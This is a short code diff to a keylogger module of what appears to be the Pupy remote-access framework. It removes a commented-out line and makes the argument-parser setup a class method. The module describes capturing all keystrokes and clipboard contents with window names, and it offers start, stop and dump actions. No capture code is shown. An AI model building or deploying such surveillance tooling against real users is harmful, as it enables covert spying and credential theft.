@@ -20,16 +20,17 @@ class KeyloggerModule(PupyModule):
         A keylogger to monitor all keyboards interaction including the clipboard :-)
         The clipboard is also monitored and the dump includes the window name in which the keys are beeing typed
     """
-    #max_clients=1
+
     unique_instance = True
     dependencies = {
         'windows': [ 'pupwinutils.keylogger' ],
         'linux': [ 'keylogger' ],
     }
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='keylogger', description=self.__doc__)
-        self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='keylogger', description=cls.__doc__)
+        cls.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
 
     def stop_daemon(self):
         self.success("keylogger stopped")
